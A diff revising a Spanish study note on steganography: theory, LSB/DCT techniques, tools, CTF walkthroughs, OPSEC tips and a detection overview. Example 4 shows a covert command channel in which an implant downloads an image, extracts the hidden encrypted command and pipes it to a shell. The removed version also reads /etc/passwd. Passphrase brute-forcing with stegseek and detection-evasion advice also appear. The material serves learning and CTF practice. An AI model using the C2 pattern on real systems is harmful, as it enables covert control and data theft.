@@ -1,460 +1,379 @@
-# Esteganografía: Conceptos, Herramientas y Práctica Completa
-
-> **Definición rápida**: Arte y ciencia de ocultar información dentro de otro medio (portador) de forma que su existencia pase desapercibida. A diferencia de la criptografía (oculta el *contenido*), la esteganografía oculta la *existencia misma* del mensaje.
-
+---
+aliases:
+  - Esteganografía
+  - Steganografía
+  - Ocultamiento de Mensajes
+  - Stego Fundamentos
+tags:
+  - sec/stego
+tipo: concepto
+estado: terminado
+creado: 2026-10-11
+actualizado: 2026-10-11
+relacionado:
+  - "[[Estegoanálisis - Detección y ContraMedidas]]"
+  - "[[Steghide - Uso Avanzado]]"
+  - "[[Stegseek - Guía Rápida]]"
+  - "[[Zsteg - Análisis LSB PNG]]"
+  - "[[Wireshark y Tshark]]"
+fuente: "https://en.wikipedia.org/wiki/Steganography"
 ---
 
-## 1. Fundamentos Teóricos
+# Esteganografía: Conceptos, Herramientas y Práctica
 
-### 1.1 Diferencia clave: Criptografía vs Esteganografía vs Estegoanálisis
+**Esteganografía** (*steganography*) es el arte y la ciencia de **ocultar la existencia misma de un mensaje** dentro de otro medio llamado portador (*cover*). A diferencia de la criptografía, que cifra el contenido y deja a la vista que hay un mensaje, la esteganografía hace que el portador parezca un archivo perfectamente normal: si nadie sospecha, nadie analiza. En la práctica ofensiva moderna se usa para exfiltración de datos, canales de comando y control (C2) y retos de CTF.
 
-| Concepto | Objetivo | Visibilidad |
-|----------|----------|-------------|
-| **Criptografía** | Proteger el contenido (confidencialidad) | Mensaje visible, ilegible sin clave |
-| **Esteganografía** | Ocultar la existencia de la comunicación | Mensaje invisible, portador aparentemente normal |
-| **Estegoanálisis** | Detectar y/o extraer información oculta | Análisis forense del portador |
+> [!info] La tríada de la ocultación
+> - **Criptografía**: el mensaje se ve, pero no se entiende. Ataque: fuerza bruta / criptoanálisis.
+> - **Esteganografía**: el mensaje no se ve. Ataque: estegoanálisis (detección estadística y extracción).
+> - **Estegoanálisis**: rama defensora/forense que busca, detecta y extrae lo oculto (ver [[Estegoanálisis - Detección y ContraMedidas]]).
+>
+> La combinación fuerte es **cifrar primero, esteganografiar después**: AES-256 del payload y luego embedding. Así, aunque detecten el estego-objeto, el contenido sigue protegido.
 
-> **Combinación ideal**: Cifrar **primero** (AES, ChaCha20) → luego esteganografiar. Así si detectan el mensaje, sigue siendo ilegible.
-
-### 1.2 Modelo Matemático Básico
-
-```
-Portador (Cover) + Mensaje Secreto + Clave (opcional) → Estego-objeto (Stego)
-```
-
-- **Cover**: Imagen, audio, video, texto, binario, tráfico de red, etc.
-- **Payload**: Datos a ocultar (texto, archivo, shellcode, credenciales)
-- **Clave**: Parámetro secreto para embarque/desembarque (seguridad 추가)
-
-### 1.3 Capacidad vs Robustez vs Imperceptibilidad (Triángulo)
+## 1. Modelo matemático
 
 ```
-        Capacidad (cuánto escondes)
-              /\
-             /  \
-            /    \
-    Robustez ------ Imperceptibilidad
-  (sobrevive a      (indetectable
-   compresión,      visual/estadísticamente)
-   recorte, ruido)
+Cover (portador) + Payload (mensaje) + Key (clave, opcional)  →  Stego-objeto
 ```
 
-- **Alta capacidad** → más ruido estadístico → más detectable
-- **Alta robustez** → redundancia → menor capacidad
-- **Alta imperceptibilidad** → cambios mínimos → frágil a transformaciones
+| Término | Significado |
+|---|---|
+| **Cover** | Archivo limpio: imagen, audio, vídeo, texto, paquete de red |
+| **Payload / message** | Datos a ocultar: texto, archivo, shellcode, credenciales |
+| **Key** | Parámetro secreto (passphrase, semilla PRNG) que gobierna embedding/extracción |
+| **Stego-objeto** | Cover + payload embebido; debe ser indistinguible de una cover |
+| **Capacity** | Máximo de bits que caben sin degradar el portador |
+| **Imperceptibilidad** | Grado de invisibilidad visual/auditiva/estadística del cambio |
+| **Robustez** | Sobrevivencia del payload a transformaciones (compresión, recorte, ruido) |
 
----
+### El triángulo de compromiso
 
-## 2. Técnicas Principales en Imágenes
-
-### 2.1 Dominio Espacial (LSB - Least Significant Bit)
-
-| Variante | Descripción | Capacidad | Robustez |
-|----------|-------------|-----------|----------|
-| **LSB 1-bit** | Modifica el bit menos significativo de cada canal (R,G,B) | ~12.5% del tamaño imagen | Muy baja (compresión JPEG la destruye) |
-| **LSB n-bits** | Usa 2-4 bits menos significativos | 2-4x más | Menor calidad visual |
-| **LSB Randomizado** | Clave semilla PRNG para dispersar bits | Igual | Más difícil detección estadística |
-| **PVD (Pixel Value Differencing)** | Adapta bits según diferencia entre píxeles | Variable | Mejor imperceptibilidad |
-
-**Ejemplo LSB 1-bit (RGB 24bpp)**:
 ```
-Píxel original:  R=11010101  G=01101100  B=10011010
-Mensaje (bits):  1           0           1
-Píxel modificado: R=11010101  G=01101100  B=10011011  (solo LSB de B cambió)
+            Capacidad
+           (bits ocultos)
+                /\
+               /  \
+              /    \
+   Robustez ---------- Imperceptibilidad
+ (sobrevive a        (invisible visual y
+  compresión,         estadísticamente)
+  recorte, ruido)
 ```
 
-### 2.2 Dominio de Frecuencia (Transformadas)
+- **Más capacidad** ⇒ más píxeles/bits modificados ⇒ **más ruido estadístico** ⇒ más detectable.
+- **Más robustez** ⇒ redundancia/codificación (matrix embedding, corrección) ⇒ menos capacidad efectiva.
+- **Más imperceptibilidad** ⇒ cambios mínimos y selectivos ⇒ **más frágil** ante transformaciones.
 
-| Técnica | Transformada | Uso típico |
-|---------|--------------|------------|
-| **DCT** | Discrete Cosine Transform | JPEG (coeficientes AC) |
-| **DWT** | Discrete Wavelet Transform | JPEG2000, PNG sin pérdidas |
-| **DFT** | Discrete Fourier Transform | Análisis espectral |
+> [!tip] Regla práctica de CTF
+> Si el archivo "se ve raro" o es sospechosamente grande para su tipo, empieza por capacidad: **capacidad usada ≈ tamaño del payload**. Un PNG de 800×600 con 3 canales de 8 bits admite teóricamente 800×600×3 = 1.440.000 bits = **180 KB** en LSB 1-bit; que un payload de 200 bytes quepa es trivial, pero que el histograma se deforme depende de cuántos bits se usen.
 
-**Ventaja**: Sobrevive a compresión lossy (JPEG) si se modifica coeficientes bajos/medios.
+## 2. Breve historia
 
-### 2.3 Técnicas Basadas en Formato/Metadatos
+| Época | Técnica | Nota |
+|---|---|---|
+| Siglo V a.C. | Herodoto: tatuajes bajo vendajes, mensajes en tablillas de cera recubiertas | Origen documentado del concepto |
+| Siglo XVI | Tratados de Trithemius (*Steganographia*, 1499) | Clasificación temprana: ocultación por cifrado + encubrimiento |
+| Guerras mundiales | Microfilm, tinta invisible, letras de puntos en cartas | Uso militar/inteligencia |
+| 1985 | Primeros trabajos digitales: *Comutational Steganography* | Fundamentos algorítmicos modernos |
+| 2000s | LSB en imágenes digitales, steghide, JSteg, OutGuess, F5 | Explosión de herramientas open source |
+| 2010s–hoy | DCT/DWT adaptativos, GANs/adversarial, canales de red (DNS, HTTP), malware (APT28, Stegoloader) | Ver [[Estegoanálisis - Detección y ContraMedidas]] §9 |
 
-| Método | Descripción | Ejemplo |
-|--------|-------------|---------|
-| **Appending** | Datos al final del archivo (EOF) | `cat secreto.txt >> imagen.jpg` |
-| **Chunk/Segment injection** | PNG: chunks `tEXt`, `zTXt`, `iTXt`; JPEG: segmentos `APPn` | `exiftool -Comment="datos" img.jpg` |
-| **Headers falsos** | Cabeceras válidas pero datos ocultos en padding | Polyglots (archivo válido en 2+ formatos) |
+## 3. Taxonomía de técnicas
 
----
+### 3.1 Dominio espacial (imágenes/audio)
 
-## 3. Herramientas Principales
+| Técnica | Mecánica | Capacidad | Robustez | Detectabilidad |
+|---|---|---|---|---|
+| **LSB 1-bit** | Sustituye el bit menos significativo de cada canal (R,G,B/A) por bits del mensaje | ~12,5% del tamaño crudo (3/24 bits por píxel RGBA) | Muy baja: JPEG la destruye | Media (chi², RS, histogramas) |
+| **LSB n-bits** | Usa los 2–4 bits menos significativos | 2–4× más | Muy baja | Alta (degrada visibilidad) |
+| **LSB matching (±1)** | Si el LSB no coincide, suma/resta ±1 aleatorio en vez de forzar el bit | Igual | Baja | **Baja**: rompe la correlación par/impar que detecta χ² |
+| **PVD** (*Pixel Value Differencing*) | Adapta la cantidad de bits según la diferencia entre píxeles vecinos (zonas planas → pocos bits) | Variable | Media | Baja (respeta textura) |
+| **Embedding adaptativo (edge/texture)** | Solo modifica bordes y textura de alta varianza | Baja–media | Media | Muy baja (hoy el estándar) |
+| **OutGuess/F5 (JPEG)** | Modifica coeficientes AC de la DCT preservando el histograma | Baja–media | **Alta** (sobrevive recompresión) | Baja si usa matrix embedding |
 
-### 3.1 Línea de Comandos (CLI)
+**Mecánica LSB 1-bit (24 bpp RGB):**
 
-| Herramienta | Propósito | Formatos | Instalación |
-|-------------|-----------|----------|-------------|
-| **stegseek** | **Fuerza bruta de contraseña** en steghide | JPEG, BMP, WAV, AU | `go install github.com/RickdeJager/stegseek@latest` |
-| **steghide** | Embed/extract con passphrase + cifrado (AES-256) | JPEG, BMP, WAV, AU | `apt install steghide` |
-| **zsteg** | Detector/extract LSB en PNG/BMP (muy rápido) | PNG, BMP | `gem install zsteg` |
-| **stegsolve** | GUI Java: análisis bit-planes, canales, metadata | Multi | `java -jar stegsolve.jar` |
-| **exiftool** | Leer/escribir metadatos EXIF, IPTC, XMP | Casi todos | `apt install libimage-exiftool-perl` |
-| **binwalk** | Análisis firmware/binarios, extrae archivos embebidos | Binarios, imágenes | `apt install binwalk` |
-| **foremost/scalpel** | File carving (recuperar archivos por firmas) | Raw, dd images | `apt install foremost` |
-| **strings** | Extraer cadenas ASCII/Unicode imprimibles | Cualquier binario | Built-in |
-| **xxd / hexdump** | Inspección hexadecimal | Cualquier archivo | Built-in |
+```
+Píxel original:   R=11010101  G=01101100  B=10011010
+Mensaje (bits):    1            0            1
+Píxel modificado: R=11010101  G=01101100  B=10011011   ← solo la LSB de B cambió
+```
 
-### 3.2 Especializadas
+Cada canal aporta 1 bit por píxel: 3 canales × 1 bit = 3 bits por píxel; a 8 bits/byte, un byte de mensaje consume 8/3 ≈ 2,67 píxeles.
 
-| Herramienta | Especialidad |
-|-------------|--------------|
-| **openstego** | Java CLI/GUI, plugins para algoritmos múltiples |
-| **stegonline** | Web (George Omura): LSB, RGB, canales, XOR |
-| **steganography-toolkit** | Suite Python (LSB, DCT, espectral) |
-| **silenteye** | Qt GUI multiplataforma |
-| **deepsteg** | Basado en deep learning (adversarial) |
-| **stegcloak** | Esteganografía en texto (Unicode zero-width chars) |
+### 3.2 Dominio de frecuencia / espectral
 
-### 3.3 Estegoanálisis (Detección)
+| Transformada | Dónde vive | Formato asociado | Comentario |
+|---|---|---|---|
+| **DCT** (Discrete Cosine Transform) | Coeficientes AC de bloques 8×8 | JPEG, MPEG | Base de JSteg, OutGuess, F5; resistente a compresión lossy |
+| **DWT** (Discrete Wavelet Transform) | Bandas de aproximación/detalle | JPEG2000, WAV | Multi-resolución, buena robustez |
+| **DFT** (Discrete Fourier Transform) | Espectro de frecuencias | Análisis genérico | Frecuente en audio (phase coding, LSB en frecuencias seleccionadas) |
 
-| Herramienta | Qué detecta |
-|-------------|-------------|
-| **stegdetect** | JSteg, OutGuess, F5, invisible secrets en JPEG |
-| **stegspy** | Firmas de herramientas conocidas |
-| **AI-based** | CNN entrenados (Steganalysis Net, SRNet) |
-| **Statistical** | Chi-square, RS Analysis, Sample Pair Analysis (SPA) |
+> [!info] Por qué el dominio frecuencial es más robusto
+> La compresión JPEG descarta información de alta frecuencia; si el payload vive en coeficientes AC medios, **sobrevive** al reescalonado/recompresión. El precio: cada cambio afecta muchos píxeles tras la transformada inversa, lo que exige algoritmos más cuidadosos (matrix embedding, permutación con clave).
 
----
+### 3.3 Formato y metadatos
 
-## 4. Proceso de Ocultación (Embedding) - Paso a Paso
+| Método | Mecánica | Herramienta típica | Detección |
+|---|---|---|---|
+| **Appending (EOF)** | Datos tras el marcador final (`FFD9` JPEG, `IEND` PNG) | `cat secreto.zip >> foto.jpg` | `binwalk`, `xxd`, lectura de estructura |
+| **Chunks PNG** | `tEXt`, `zTXt`, `iTXt`, `zlib`, chunks privados `xxxx` | `exiftool -Comment=...`, scripts | `pngcheck -v`, `zsteg` (metadata) |
+| **Segmentos JPEG** | `APPn` (EXIF=`APP1`), `COM` (segmento de comentario) | `exiftool` | `exiftool`, `jpegdump.py` |
+| **Polyglots** | Archivo válido en ≥2 formatos (JPEG+ZIP, PDF+JS) | concatenación cuidadosa / scripts | `unzip -l archivo.jpg`, firmas cruzadas |
+| **Cabeceras falsas / padding** | Extensiones engañosas (GIF89a como cabecera de un ejecutable) | edición manual | `file`, `xxd` |
 
-### 4.1 Preparación del Payload
+### 3.4 Texto y Unicode
+
+| Técnica | Mecánica | Riesgo |
+|---|---|---|
+| **Zero-width chars** | Inserción de U+200B/U+200C/U+200D/U+FEFF entre caracteres visibles | `stegcloak`, detectable con `xxd`/scripts |
+| **Homoglifos / synonym encoding** | Sustitución de palabras o caracteres visualmente idénticos | Difícil de detectar sin original |
+| **Whitespace encoding** | Espacios/tabuladores al final de líneas codificando bits | Visible con `cat -A` |
+
+### 3.5 Red (canales encubiertos)
+
+| Canal | Mecánica | Detección |
+|---|---|---|
+| **DNS** (tunnels: DNSCat, Iodine) | Subdominios que codifican datos en consultas A/TXT | Entropía de consultas, volumen, dominios largos |
+| **HTTP headers / User-Agent / cookies** | Datos en campos que la app ignora | Inspección profunda (DPI), WAF |
+| **Timing / inter-packet delay** | Modulación en la latencia entre paquetes | Análisis estadístico de timings |
+| **ICMP payload / covert channels** | Datos dentro del echo-request legítimo | `tcpdump`/[[Wireshark y Tshark]]: tamaños ICMP anómalos |
+| **Stego en imágenes servidas por web** | C2 que descarga comandos desde imágenes LSB en GitHub/CDN |_hashes de imágenes, anomalías estadísticas |
+
+## 4. Catálogo de herramientas
+
+### 4.1 Embedding / extracción
+
+| Herramienta | Lenguaje | Formatos | Función clave | Nota |
+|---|---|---|---|---|
+| **[[Steghide - Uso Avanzado\|steghide]]** | C | JPEG, BMP, WAV, AU | `embed` / `extract` / `info` con passphrase + AES-256 | Estándar de CTF; **no soporta PNG** |
+| **[[Stegseek - Guía Rápida\|stegseek]]** | Go | (steghide) | Fuerza bruta de passphrase a ~1M intentos/s | Ver [[Stegseek - Guía Rápida]] |
+| **[[Zsteg - Análisis LSB PNG\|zsteg]]** | Ruby | PNG, BMP | Detecta/extrae LSB por canal, bit, orden; metadata | Ver [[Zsteg - Análisis LSB PNG]] |
+| **stegsolve** | Java (GUI) | imágenes | Explorador de bit-planes, canales, XOR, concatenación | Manual, imprescindible para análisis visual |
+| **stegonline** | Web | PNG/JPEG | LSB interactivo, canales, XOR, extracción | Sin instalación |
+| **openstego** | Java | PNG, JPEG | Múltiples algoritmos + plugins | Deja firmas propias |
+| **outguess / jsteg / f5** | C | JPEG | Estego en coeficientes DCT | Clásicos académicos |
+| **stegcloak** | JS/CLI | texto | Zero-width en Unicode | Texto, no binario |
+
+### 4.2 Análisis y apoyo
+
+| Herramienta | Función | Uso típico |
+|---|---|---|
+| **exiftool** | Leer/escribir metadatos EXIF/IPTC/XMP, comentarios | `exiftool img.jpg` |
+| **binwalk** | Firma de archivos embebidos + entropía por offset | `binwalk -e img.jpg` |
+| **pngcheck** | Validación y volcado de chunks PNG + CRC | `pngcheck -v img.png` |
+| **foremost / scalpel** | File carving por firmas | Recuperar archivos de imágenes/dumps |
+| **strings / xxd / hexdump** | Cadenas e inspección hex | Primer barrido de cualquier archivo |
+| **stegdetect / stegspy** | Firmas de algoritmos JPEG conocidos | Detección (ver [[Estegoanálisis - Detección y ContraMedidas]]) |
+| **ent** | Entropía de Shannon por byte | Distinguir cifrado/estego de contenido natural |
+
+## 5. Metodología de embedding (lado atacante)
+
+### 5.1 Preparar el payload
 
 ```bash
-# 1. Cifrar primero (RECOMENDADO)
-openssl enc -aes-256-cbc -salt -pbkdf2 -in secreto.txt -out secreto.enc
-# Ingresa passphrase fuerte
-
-# 2. O comprimir + cifrar
+# 1) Comprimir (payload binario comprime mal, texto mucho)
 tar -czf datos.tar.gz carpeta_secreta/
+
+# 2) Cifrar SIEMPRE antes de embeber (AES-256 + PBKDF2)
 openssl enc -aes-256-cbc -salt -pbkdf2 -in datos.tar.gz -out payload.enc
+# passphrase: definirla fuera del comando o con -pass stdin para no dejarla en historial
 ```
 
-### 4.2 Selección del Portador (Cover)
+### 5.2 Elegir el portador (*cover*)
 
-**Criterios de buena cover**:
-- ✅ Alta entropía / textura compleja (fotos naturales, ruido)
-- ✅ Tamaño suficiente para payload + overhead
-- ✅ Formato sin pérdidas (PNG, BMP, TIFF, WAV, FLAC) si usas LSB
-- ✅ Evita: capturas de pantalla, gráficos simples, fondos sólidos
-- ✅ **Nunca reutilices** la misma cover para múltiples payloads
+| Criterio | Buena cover | Mala cover |
+|---|---|---|
+| Textura | Foto natural, ruido de sensor, césped/agua/arena | Fondos sólidos, capturas de pantalla, logos, PNG con pocas variaciones |
+| Formato | PNG/BMP/WAV/TIFF (sin pérdidas) si usas LSB; JPEG si usas steghide/DCT | GIF de 256 colores con LSB |
+| Tamaño | `capacidad ≥ tamaño(payload) × 1,2` | Cover minúscula con payload enorme |
+| Historial | Cover **nunca publicada antes** (evita análisis diferencial) | Cover reutilizada de otra operación |
+| Tamaño final | Delta payload+overhead ≈ decenas de KB | 50 KB → 50 MB (alerta inmediata) |
 
-### 4.3 Embedding con steghide (Ejemplo clásico)
+### 5.3 Embedding con steghide (referencia)
 
 ```bash
-# Ocultar archivo cifrado en imagen JPEG
 steghide embed -cf foto.jpg -ef payload.enc -p "MiPassphraseFuerte123!" -z 9
-
-# Parámetros:
 # -cf  cover file (portador)
 # -ef  embed file (payload a ocultar)
-# -p   passphrase (clave para embarque/desembarque)
-# -z   nivel compresión 1-9 (9 = mejor compresión payload antes de ocultar)
-# -e   algoritmo cifrado (default: rijndael-256 = AES-256)
-# -K   usar clave en vez de passphrase (hex)
-# -N   no añadir checksum (más capacidad, menos integridad)
+# -p   passphrase (si se omite, la pide en modo interactivo)
+# -z   compresión zlib 1-9 antes de cifrar (9 = máxima)
+# -e   algoritmo de cifrado (rijndael-256 por defecto; serpent-256, twofish-256…)
+# -K   usar keyfile binario de 32 bytes en lugar de passphrase
+# -N   no guardar el nombre del archivo oculto (gana bytes, pierde metadato)
+# -f   sobrescribir la cover
 ```
 
-### 4.4 Embedding LSB en PNG con zsteg / Python
+Detalle completo de flags, capacidad y errores: [[Steghide - Uso Avanzado]].
+
+### 5.4 Embedding LSB en PNG (zsteg / Python)
 
 ```bash
-# zsteg puede EMBED (solo LSB simple)
+# zsteg embebe (LSB simple) — cubre los casos básicos de CTF
 zsteg -E "payload.txt" cover.png stego.png
+```
 
-# Python - LSB 1-bit RGB (ejemplo mínimo)
-python3 -c "
+```python
+# LSB 1-bit RGB mínimo y correcto (delimiter NUL al final)
 from PIL import Image
-img = Image.open('cover.png')
-pixels = img.load()
-msg = open('payload.enc','rb').read()
-bits = ''.join(f'{b:08b}' for b in msg) + '00000000'  # delimitador null
-idx = 0
+img = Image.open("cover.png"); px = img.load()
+bits = "".join(f"{b:08b}" for b in open("payload.enc", "rb").read()) + "00000000"
+i = 0
 for y in range(img.height):
     for x in range(img.width):
-        if idx >= len(bits): break
-        r,g,b = pixels[x,y]
-        if idx < len(bits): r = (r & 0xFE) | int(bits[idx]); idx+=1
-        if idx < len(bits): g = (g & 0xFE) | int(bits[idx]); idx+=1
-        if idx < len(bits): b = (b & 0xFE) | int(bits[idx]); idx+=1
-        pixels[x,y] = (r,g,b)
-    if idx >= len(bits): break
-img.save('stego.png')
-"
+        if i >= len(bits): break
+        r, g, b = px[x, y]
+        for setter in ("r", "g", "b"):
+            if i < len(bits):
+                v = {"r": r, "g": g, "b": b}[setter]
+                v = (v & 0xFE) | int(bits[i]); i += 1
+                if setter == "r": r = v
+                elif setter == "g": g = v
+                else: b = v
+        px[x, y] = (r, g, b)
+    if i >= len(bits): break
+img.save("stego.png")
 ```
 
----
+## 6. Metodología de extracción (lado defensor/CTF)
 
-## 5. Proceso de Extracción (Extraction) - Paso a Paso
+Orden recomendado — cada paso descarta hipótesis:
 
-### 5.1 Con steghide (requiere passphrase)
+| # | Paso | Comando | Qué busca |
+|---|---|---|---|
+| 1 | Identificar | `file img.jpg && exiftool img.jpg` | Tipo real, dimensiones, comentario, software que lo creó |
+| 2 | Cadenas | `strings -n 6 img.jpg \| grep -iE 'flag\|pass\|key\|secret'` | Flags/trampas visibles, cabeceras de archivos |
+| 3 | Estructura | `binwalk -e img.jpg` · `pngcheck -v img.png` | Archivos embebidos, chunks anómalos, CRC rotos |
+| 4 | LSB (PNG/BMP) | `zsteg -a img.png` | Bit-planes, metadata, XOR/add |
+| 5 | Steghide (JPEG/BMP/WAV/AU) | `steghide info img.jpg` | ¿Datos steghide? ¿con passphrase? |
+| 6 | Passphrase débil | `stegseek --crack img.jpg rockyou.txt` | Fuerza bruta de la passphrase |
+| 7 | Visual | stegsolve / stegonline: bit-planes, canales, XOR, diferencia | Patrones visibles en LSB |
+| 8 | Estadística | `stegdetect`, χ², entropía | Confirmar presencia (ver [[Estegoanálisis - Detección y ContraMedidas]]) |
+| 9 | Recursión | `file extraído && strings extraído` | El payload suele ser otro contenedor |
 
-```bash
-# Extraer a archivo
-steghide extract -sf stego.jpg -xf extraido.enc -p "MiPassphraseFuerte123!"
+## 7. Ejemplos prácticos de CTF
 
-# Ver info sin extraer
-steghide info stego.jpg -p "MiPassphraseFuerte123!"
-```
-
-### 5.2 **stegseek** - Fuerza Bruta de Passphrase (Tu caso)
-
-```bash
-# Ataque diccionario contra steghide
-stegseek --crack stego.jpg /usr/share/wordlists/rockyou.txt
-
-# Con wordlist personalizada
-stegseek --crack stego.jpg ./mis_passphrases.txt
-
-# Mostrar passphrase encontrada y extraer automático
-stegseek --crack stego.jpg rockyou.txt --extract
-
-# Salida típica:
-# [+] Found passphrase: "password123"
-# [+] Extracting to "stego.jpg.out"...
-```
-
-> **Nota**: stegseek solo funciona con archivos creados por **steghide** (formato propietario con magic bytes `steghide`).
-
-### 5.3 Extracción LSB genérica (sin passphrase)
+### Ejemplo 1 — Flag en LSB de PNG
 
 ```bash
-# zsteg - prueba automática múltiples configuraciones LSB
-zsteg stego.png                    # Análisis completo
-zsteg -a stego.png                 # Todos los métodos
-zsteg -b 1,2,3,4 -o lsb stego.png  # Bits 1-4, orden lsb
-
-# Extraer payload binario detectado
-zsteg -E "b1,rgb,lsb,xy" stego.png > extraido.bin
-```
-
-### 5.4 Análisis de Metadatos y Estructura
-
-```bash
-# EXIF / comentarios / chunks
-exiftool stego.jpg
-exiftool -b -Comment stego.jpg > extraido.bin
-
-# PNG chunks sospechosos
-pngcheck -v stego.png
-# Busca chunks: tEXt, zTXt, iTXt, cUSTOM, etc.
-
-# Binwalk - archivos embebidos
-binwalk -e stego.jpg
-# Extrae a _stego.jpg.extracted/
-
-# Strings - cadenas legibles
-strings stego.jpg | grep -i "flag\|password\|secret"
-```
-
-### 5.5 Análisis Visual (StegSolve / stegonline)
-
-1. Abrir `stego.png` en **stegsolve.jar** o **stegonline.com**
-2. Revisar **Bit Planes** (Red 0, Green 0, Blue 0 = LSB)
-3. Si hay patrón visible/ruido en bit 0 → hay LSB embedding
-4. Canales **Alpha** (si RGBA) también usados
-
----
-
-## 6. Ejemplos Prácticos Completos
-
-### Ejemplo 1: CTF - Imagen con Flag en LSB (PNG)
-
-```bash
-# 1. Reconocimiento
 file flag.png
 # PNG image data, 800 x 600, 8-bit/color RGB, non-interlaced
-
-# 2. zsteg automático
 zsteg flag.png
-# Output típico:
-# b1,rgb,lsb,xy       .. text: "flag{st3g0_1s_fun_123}"
-
-# 3. Extraer directo
-zsteg -E "b1,rgb,lsb,xy" flag.png > flag.txt
-cat flag.txt
+# b1,rgb,lsb,xy  .. text: "flag{st3g0_1s_fun_123}"
+zsteg -E "b1,rgb,lsb,xy" flag.png > flag.txt && cat flag.txt
 # flag{st3g0_1s_fun_123}
 ```
 
-### Ejemplo 2: JPEG con steghide + Passphrase Débil (stegseek)
+### Ejemplo 2 — JPEG con steghide + passphrase débil
 
 ```bash
-# 1. Identificar formato steghide
 steghide info desafio.jpg
-# "steghide 0.5.1 - embedded data: 1024 bytes, encrypted: rijndael-256"
-
-# 2. Fuerza bruta con rockyou
+# embedded file: 1024 bytes, encrypted: rijndael-256  → sí es steghide
 stegseek --crack desafio.jpg /usr/share/wordlists/rockyou.txt
-# [+] Found passphrase: "secret123"
-# [+] Extracting to "desafio.jpg.out"...
-
-# 3. Ver contenido extraído
-file desafio.jpg.out
-cat desafio.jpg.out
-# flag{...} o archivo binario
+# [+] Found passphrase: "secret123"   /   [+] Extracting to "desafio.jpg.out"
+cat desafio.jpg.out        # flag{...} o binario → repetir paso 9 de la tabla
 ```
 
-### Ejemplo 3: Archivo Poliglota (Polyglot) - JPEG + ZIP
+### Ejemplo 3 — Polyglot JPEG+ZIP
 
 ```bash
-# Crear: JPEG válido que TAMBIÉN es ZIP válido
-cat foto.jpg archivo_secreto.zip > polyglot.jpg
-
-# Verificar
-file polyglot.jpg      # JPEG image data
-unzip -l polyglot.jpg  # Lista contenido ZIP
-
-# Extraer
+cat foto.jpg secreto.zip > polyglot.jpg
+file polyglot.jpg      # JPEG image data  (sigue siendo JPEG válido)
+unzip -l polyglot.jpg  # …y también ZIP válido
 unzip polyglot.jpg -d extraido/
 ```
 
-### Ejemplo 4: Exfiltración Realista - C2 via Imagen
+### Ejemplo 4 — C2 vía imagen (conceptual, laboratorio)
 
 ```bash
-# Atacante: Preparar payload (comando cifrado)
-echo "id; hostname; cat /etc/passwd" | openssl enc -aes-256-cbc -pbkdf2 -k "ClaveC2" > cmd.enc
-
-# Embed en imagen legítima del servidor web
-steghide embed -cf /var/www/html/banner.jpg -ef cmd.enc -p "ClaveC2" -z 9
-
-# Victima (malware/implant): Descarga imagen, extrae, ejecuta
-wget -q https://target.com/banner.jpg -O /tmp/banner.jpg
-steghide extract -sf /tmp/banner.jpg -xf /tmp/cmd.enc -p "ClaveC2"
-openssl enc -d -aes-256-cbc -pbkdf2 -k "ClaveC2" -in /tmp/cmd.enc | bash
+# Atacante: comando cifrado dentro de una imagen del servidor web
+echo "id; hostname" | openssl enc -aes-256-cbc -pbkdf2 -k "ClaveC2" > cmd.enc
+steghide embed -cf banner.jpg -ef cmd.enc -p "ClaveC2" -z 9 -f
+# Víctima (implant): descargar, extraer, ejecutar
+steghide extract -sf banner.jpg -xf cmd.enc -p "ClaveC2"
+openssl enc -d -aes-256-cbc -pbkdf2 -k "ClaveC2" -in cmd.enc | sh
 ```
 
----
+> [!warning] Este flujo es documentación de laboratorio
+> El ejemplo anterior describe el patrón que usan campañas reales (APT28, Stegoloader). Reproduce **solo** en laboratorios propios o con autorización escrita; la sección 9 cubre cómo detectarlo como defensor.
 
-## 7. Estegoanálisis: Cómo Detectar Esteganografía
-
-### 7.1 Análisis Estadístico (Automatizado)
-
-```bash
-# stegdetect - JPEG clásico
-stegdetect desafio.jpg
-# Output: desafio.jpg : jsteG(??)  <- probable JSteg/OutGuess
-
-# stegspy - firmas de herramientas
-stegspy desafio.jpg
-```
-
-### 7.2 Análisis Visual (Manual)
-
-| Indicador | Qué buscar |
-|-----------|------------|
-| **Bit-plane 0 (LSB)** | Ruido aleatorio = normal; Patrones = embedding |
-| **Histogramas RGB** | Picos en valores pares/impares (LSB matching) |
-| **Pares de valores** | RS Analysis, Chi-square test |
-| **Compresión** | Re-comprimir JPEG y comparar tamaños |
-
-### 7.3 Herramientas de Detección Avanzada
-
-```bash
-# Python - Chi-square test en LSB
-python3 -c "
-from PIL import Image
-import numpy as np
-img = np.array(Image.open('sospechosa.png'))
-lsb = img & 1
-# Chi-square en cada canal
-for c in range(3):
-    hist = np.bincount(lsb[:,:,c].flatten(), minlength=2)
-    chi2 = sum((hist - hist.mean())**2 / hist.mean())
-    print(f'Canal {c}: chi2={chi2:.2f} (>{3.84} = sospechoso p<0.05)')
-"
-```
-
----
-
-## 8. Buenas Prácticas OPSEC
+## 8. OPSEC y buenas prácticas
 
 | Regla | Por qué |
-|-------|---------|
-| **Cifra ANTES de esteganografiar** | Defensa en profundidad |
-| **Usa covers únicas por operación** | Evita análisis diferencial |
-| **Covers con alta entropía natural** | Fotos RAW, ruido de sensor, audio ambiental |
-| **Limpia metadata EXIF** | `exiftool -all= imagen.jpg` |
-| **Verifica tamaño final** | No debe llamar la atención (ex: 50KB → 50MB) |
-| **Prueba extracción ANTES de enviar** | Evita corrupción silenciosa |
-| **Considera formato sin pérdidas** | PNG/BMP/TIFF/WAV/FLAC para LSB |
-| **Evita herramientas con firmas conocidas** | steghide, openstego dejan headers detectables |
+|---|---|
+| Cifrar **antes** de esteganografiar | Defensa en profundidad: detección ≠ lectura |
+| Cover única por operación | El análisis diferencial entre covers gemelas delata el embedding |
+| Covers de alta entropía natural | Ruido de sensor, fotos RAW; nada de capturas ni gráficos planos |
+| Usar ≤ 10–20% de la capacidad | Menos bits ⇒ menos deformación estadística |
+| Limpiar metadatos de la cover | `exiftool -all= -overwrite_original cover.jpg` |
+| Formato sin pérdidas para LSB | PNG/BMP/WAV; JPEG destruye el LSB en cada recompressão |
+| Verificar la extracción **antes** de transmitir | Evita payloads corruptos silenciosos |
+| Evitar firmas de herramienta | steghide/openstego dejan artefactos estructurales detectables |
+| Passphrase larga y aleatoria | Ver [[Stegseek - Guía Rápida]]: rockyou rompe passphrases débiles en segundos |
 
----
+## 9. Detección: el lado contrario
 
-## 9. Referencias y Recursos
+Resumen; teoría completa en [[Estegoanálisis - Detección y ContraMedidas]]:
 
-### Documentación Oficial
-- [steghide manual](http://steghide.sourceforge.net/)
-- [stegseek GitHub](https://github.com/RickdeJager/stegseek)
